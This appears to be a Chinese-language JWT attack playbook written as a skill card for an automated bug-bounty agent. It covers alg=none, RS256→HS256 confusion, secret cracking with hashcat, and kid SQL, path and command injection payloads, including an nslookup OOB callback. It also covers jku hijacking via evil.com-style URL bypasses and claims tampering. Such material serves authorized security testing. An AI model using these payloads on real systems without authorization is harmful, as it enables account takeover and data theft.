---
name: jwt-advanced
description: JWT 高阶 Light Deep Card — alg=none / RS256→HS256 混淆 / kid 注入 / jku/x5u/jwk 劫持 / claims 越权。先看 Header 再决定攻击,不堆字典。
category: vuln
tags: [auth, jwt, token, bola, bfla]
---

# JWT High-Level — Light Deep Card

> **CWE**: 347 (签名不验) / 287 (认证失败) / 639 (BOLA) | **OWASP**: A01:2021 (Broken Access Control) + A02:2021 (加密失败) | **ROI**: 高 (P0/P1)
> **轻便原则**: 先看 Header/Payload 上下文,再决定攻击方式;不堆大字典。

---

## 1. First-pass Signal

1. 解码 JWT Header / Payload (不验证签名)。
2. 记录字段: `alg`, `kid`, `jku`, `x5u`, `jwk`, `typ`, `user_id`, `role`, `exp`, `iss`, `aud`。
3. 只根据字段触发对应分支,禁止盲试全部 payload。

```markdown
JWT_Context:
- alg: HS256 / RS256 / none / ES256 / ...
- kid: yes/no (含值)
- jku/x5u/jwk: yes/no
- payload id fields: user_id / uid / sub / role / tenant
- exp/iss/aud: 是否校验异常
```

记录三要素: `HTTP_CODE` / `RESP_LENGTH_DELTA` / `TIMING_DELAY`。

---

## 2. Attack Surface

| 入口 | 备注 |
| :--- | :--- |
| **Authorization Bearer** | 最常见 |
| **Cookie 中的 token** | session token / refresh token |
| **URL 参数 ?token=** | 不安全 (日志泄露) 但常见 |
| **Header 自定义 X-Auth-Token / X-API-Key** | 企业内部接口 |
| **WebSocket 握手 JWT** | upgrade 包带 token |
| **GraphQL `Authorization`** | 与 REST 相同模式 |
| **OAuth `id_token`** | OIDC 流程 |
| **小程序 / APP `wx_session` 类** | 微信生态扩展 |

---

## 3. High-Value Targets

1. **JWT 含 `role` / `is_admin` / `permissions`** — 改 role 提权 (P0)
2. **JWT 含 `user_id` / `sub` 用作主键** — 改 id 跨用户 (P0)
3. **JWT 含 `tenant_id` / `org_id`** — 跨租户 (P0)
4. **多服务共享 JWT secret** — 一个 secret 破全系列 (P0)
5. **`kid` 接受用户输入** — SQLi/路径遍历/RCE (P0)
6. **`jku` / `x5u` 不限制域名** — JWKS 劫持 (P0)
7. **`alg=none` 接受** — 完全无签名 (P0)
8. **RS256 + 公钥可拿** — 算法混淆 (P0)

---

## 4. 决策树

### 4.0 SRC 五步评级

| 步骤 | 判断 | 失败后转向 | 评级边界 | 误判过滤 |
|---|---|---|---|---|
| 可读 | Header/Payload 可解码 | 判断字段敏感性和是否可篡改 | 普通字段低/信息 | JWT 可解码不算洞 |
| 可改 | 修改 `sub/user_id/role/tenant/exp/alg` | 若 401, 说明签名/策略有效, 转刷新、旧 token、kid/jku/x5u、弱密钥边界 | 仅本地可改无价值 | 401 是有效校验证据 |
| 服务端接受 | 修改后 200 或会话继续 | 调 `/me`、权限接口、对象接口确认身份 | 接受但身份不变需降级 | `none` 被禁用说明过滤有效 |
| 身份变化 | 当前用户/租户/角色变化 | 做 A/B 对照和最小接口验证 | 越权访问他人数据中高 | 只返回 success 不够 |
| 权限影响 | 后台、导出、配置、敏感对象可访问 | 停止高危操作, 走 HITL/最小化证据 | 高权后台/敏感操作高危候选 | 不做批量导出或破坏性动作 |

证据要求: 原 token 低权基线、修改字段、服务端响应、当前用户接口、权限接口或业务功能访问结果。不要只提交 jwt.io 截图或弱密钥猜测。

| 信号 | 首测动作 | 命中判断 |
| :--- | :--- | :--- |
| `alg=none` 或服务端接受空签名 | 去签名请求低权限接口 | 200 / role 生效 |
| `alg=RS256` 且公钥可获取 | RS256→HS256 混淆 | 用公钥作 HMAC secret 签名后 200 |
| `alg=HS256` | 弱密钥爆破 | hashcat/jwt_tool 命中 secret |
| Header 有 `kid` | 测 SQLi / 路径遍历 / 命令注入 | 500/时间/OOB/secret 命中 |
| Header 有 `jku/x5u` | URL 白名单绕过 | 服务端取攻击者 JWKS 后验签成功 |
| Header 有内嵌 `jwk` | 替换为攻击者公钥 | 服务端信任 header jwk |
| Payload 有 `user_id/role` | 先绕签名再改 ID/role | 越权/BFLA 成功 |

---

## 5. 算法与签名类

### 5.1 none / 空签名

- Header 改 `{"alg":"none","typ":"JWT"}`。
- Signature 留空: `header.payload.`。
- 只请求低风险接口(如 `/api/me`),不要直接执行敏感操作。
- 变体 `None` / `NONE` / `nOnE` (大小写绕过)。

### 5.2 RS256 → HS256 混淆

前提: 服务端使用 RS256,且公钥 / JWKS 可获取。

```python
# 用公钥内容作为 HS256 secret 重新签名
jwt.encode(payload, public_key_pem, algorithm="HS256")
```

**注意**: 公钥格式差异会影响结果;尝试 PEM 原文、去头尾、DER base64 三种。

公钥来源:
- `/.well-known/jwks.json`
- `/.well-known/openid-configuration` → `jwks_uri`
- TLS 证书 (有时同一密钥对)
- GitHub 同公司项目

### 5.3 HS256 弱密钥

```bash
hashcat -m 16500 jwt.txt rockyou.txt --force
python jwt_tool.py <token> -C -d wordlist.txt
john --format=HMAC-SHA256 jwt.txt --wordlist=rockyou.txt
```

命中后只构造最小 PoC: `role=user→admin` 或 `sub=A→B`,再进入 BOLA/BFLA 验证。

常见 weak secret: `secret` / `password` / `123456` / `jwt_secret` / 公司名 / 项目名 / 默认 placeholder。

---

## 6. `kid` 注入

| 类型 | Payload 思路 | 信号 |
| :--- | :--- | :--- |
| SQLi | `kid="1' UNION SELECT 'secret'--"` | 500 / 登录成功 / 时间差 |
| 路径遍历 | `kid="../../../../dev/null"` 或 `../../key.pem` | 错误变化 / 验签异常变化 |
| 命令注入 | `kid="key; nslookup x.oob"` | OOB 回调 |
| 文件包含 | `kid="file:///tmp/key"` | 错误差异 |
| LDAP injection | `kid="*)(uid=*"` | LDAP 错误 |

**禁止**: kid 命令注入直接执行破坏性命令;先 OOB-only。

`/dev/null` 路径遍历经典构造:
- 用 `kid: ../../../../../../dev/null` + HS256 + secret 为空 → 签名 `HMACSHA256("", "")` → 服务端读 `/dev/null` 拿到空 secret → 验签通过

---

## 7. `jku` / `x5u` / `jwk`

### 7.1 jku/x5u 劫持

1. 自建 JWKS,放攻击者公钥。
2. Header 改 `jku` / `x5u` 指向攻击者域。
3. 用对应私钥签名。
4. 若服务端未做域名白名单,会验签成功。

**白名单绕过点**: 
- `https://trusted.com.evil.com/jwks` (子域)
- `https://evil.com@trusted.com/` (URL 解析差异)
- 302 跳转 (`trusted.com/redirect?to=evil.com/jwks`)
- DNS rebinding
- `#` fragment 绕过: `https://trusted.com/jwks#evil.com`

### 7.2 header `jwk`

若服务端信任 JWT Header 中的内嵌 JWK,直接把攻击者公钥写入 `jwk`,用私钥签名:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "<攻击者公钥 n>",
    "e": "AQAB"
  }
}
```

---

## 8. Claims 逻辑攻击

| 字段 | 测试 | 影响 |
| :--- | :--- | :--- |
| `sub/user_id/uid` | A token 改 B id | BOLA |
| `role/is_admin` | user→admin | BFLA |
| `exp` | 过期 token 是否仍可用 | 会话失效问题 |
| `iss/aud` | 改 issuer/audience | 多租户绕过 |
| `tenant/org_id` | A 租户 token 改 B 租户 | 租户越权 |
| `scope` | 增加 scope 项 | 权限扩张 |
| `permissions` | 加 `["admin:*"]` | 权限绕过 |
| 自定义 claim (`is_internal`) | true/false | 业务逻辑绕过 |

---

## 9. Bypass Techniques

| 阻碍 | 绕过 |
| :--- | :--- |
| `alg=none` 被拦 | 大小写 `None` / `nOnE` |
| 强 secret 爆破不开 | 看 .git / heap dump / GitHub 复用 |
| jku 域名白名单 | 见 §7.1 5 种绕过 |
| 服务端检测 jku 是否同源 | 用 SSRF 链跳过白名单 |
| RS256 强制 | 看 `alg` 是否真的强制 — 试 HS256 / none |
| `kid` 检测格式 | base64 编码 / URL 编码 / hex |
| Token 有 nonce/timestamp | 配合时间窗内重放 |

---

## 10. Testing Methodology

```bash
# Step 1: 解码 JWT (Phase 2 必跑)
echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null

# Step 2: 按 §4 决策树选首测分支

# Step 3: alg=none 测试 (最快验证)
# Header: {"alg":"none","typ":"JWT"}
# Signature: 留空
# 改 payload 后请求 /api/me

# Step 4: 弱密钥 (HS256)
echo "$JWT" > token.jwt
hashcat -m 16500 token.jwt wordlists/jwt-common-secrets.txt

# Step 5: kid 注入
# 改 Header kid 为 SQLi/路径/命令 payload,看 500/200/timing 差异

# Step 6: Claims 改写
# 找到 user_id → 改 ID 1 → 测 BOLA
# 找到 role → 改 admin → 测 BFLA

# Step 7: jku 劫持 (高级)
# 自建 JWKS server,改 jku 指过去
# 用对应私钥签
```

---

## 11. Triage

| 现象 | 可能原因 | 下一步 |
| :--- | :--- | :--- |
| 改 payload 后 401 | 签名校验正常 | 回到签名绕过分支 |
| `none` 不生效 | 框架已修 | 不继续死磕,看 kid/jku |
| HS256 爆破失败 | 密钥强 | 查 JS/配置/泄露信息 |
| jku 请求无 OOB | 服务端未取远程 JWKS / 出站封锁 | 看错误信息/换 HTTP OOB |
| role 改了但权限不变 | 后端不用 JWT role 授权 | 改 user_id/sub 测 BOLA |
| 算法混淆失败 | 公钥格式不对 | 试 3 种公钥格式 |
| exp 改了但仍 401 | 服务端不验 exp 或用其他字段 | 测 nbf / iat |

---

## 12. False Positives

| 误报 | 真实判断 |
| :--- | :--- |
| 改 user_id 拿到数据 | 可能数据本就公开 (走 [../resource-classification.md](../resource-classification.md)) |
| `alg=none` 返回 200 但内容无 role 信息 | 可能服务端不用 JWT,看实际授权来源 |
| jku OOB 收到查询但验签不过 | 服务端取 JWKS 但仍校验本地 | 不是有效漏洞 |
| HS256 爆破命中 "default" | 可能是 placeholder 字符串,要看是否真用 |
| kid SQLi 500 但没数据 | 错误页固定模板,要看 timing-based SQLi |

---

## 13. Impact / 升级路径

| 链 | 终态 | Impact |
| :--- | :--- | :--- |
| `alg=none` + admin role | 任意管理 | Critical |
| HS256 弱密钥 + sub 改 | 任意账号接管 | Critical |
| RS256→HS256 | 任意账号接管 | Critical |
| jku 劫持 | 任意账号接管 + 长期后门 | Critical |
| kid SQLi → 拿 secret | secret 泄露 → 永久签 token | Critical |
| user_id 改 → BOLA | 拉用户数据 | High |
| tenant_id 改 → 跨租户 | 跨企业数据 | Critical |
| role 改 → BFLA | 提权 | Critical |
| exp 不验 | 永久 session | Medium-High |

**证据 (P3.5)**:
- 改 user_id 拉数据时只取 5 条样本,字段脱敏
- BFLA 验证调 1 个 admin-only API 证明权限,不批量调
- 拿到 secret 后**不要**签长期 token 留底,只签一次性 PoC

---

## 14. Pro Tips

- **JWT Header 先看 `alg`**: 这一字段决定 90% 攻击路径
- **`kid` 路径遍历到 /dev/null**: 服务端读空内容当 secret,HS256 with empty secret 签即可
- **公钥三格式都试**: PEM 原文 / 去 header/footer 行 / DER base64 — 同一密钥三种字符串
- **secret 复用极常见**: 同公司多产品 / 同框架默认 / 同 GitHub 模板 — 找一次破多个
- **`role` 不是唯一权限源**: 后端可能查 DB user 表 — 改 role 不一定生效,要改 user_id 才生效
- **WebSocket JWT**: 握手时校验,握手后不再校验 — 一旦连上长期有效
- **OAuth `id_token` ≠ access_token**: id_token 客户端用,access_token 服务端用 — 不要混
- **Refresh token 旁路**: 部分服务 refresh token 不校验 IP / device fingerprint → 偷一个永久用
- **AppSecret 复用**: 小程序 wx.* + 后端 JWT secret 有时同一个
- **加 claim 是否被处理**: 后端常用 typed unmarshal,加自定义 claim 可能被静默吃掉

---

## 15. 工具升级线

**classic 版**:
- 解码 / 改写: `jwt.io` / `jwt_tool.py` / Burp JWT Editor
- 爆破: `hashcat -m 16500` / `john --format=HMAC-SHA256`
- 自建 JWKS server: Python Flask 5 行

**toolPlus 版**:
- `mcp__yaklang__exec_codec` 链式 base64 + JSON 解码
- `mcp__yaklang__http_fuzzer` 一次 sweep 多 token 变体 (none/HS256/kid 注入)
- `mcp__yaklang__brute` 字典爆破 JWT secret
- `mcp__chrome__chrome_navigate` + `evaluate_script` 拿前端 JWT 自动解码

---

## 16. 相关参考

- JWT 构造思路: [../payload-construction/jwt-construction.md](../payload-construction/jwt-construction.md)
- API 安全 / BOLA / BFLA: [../api-security.md](../api-security.md)
- OAuth 高阶: [oauth-advanced.md](oauth-advanced.md)
- OIDC 攻击: [oidc-attacks.md](oidc-attacks.md)
- BOLA 构造: [../payload-construction/bola-construction.md](../payload-construction/bola-construction.md)
- 敏感信息利用 (secret 拿到后): [../sensitive-info-exploitation.md](../sensitive-info-exploitation.md)
- 级联策略: [../chained-logic-extended.md](../chained-logic-extended.md)
- 直觉触发: [../intuition-triggers.md](../intuition-triggers.md)
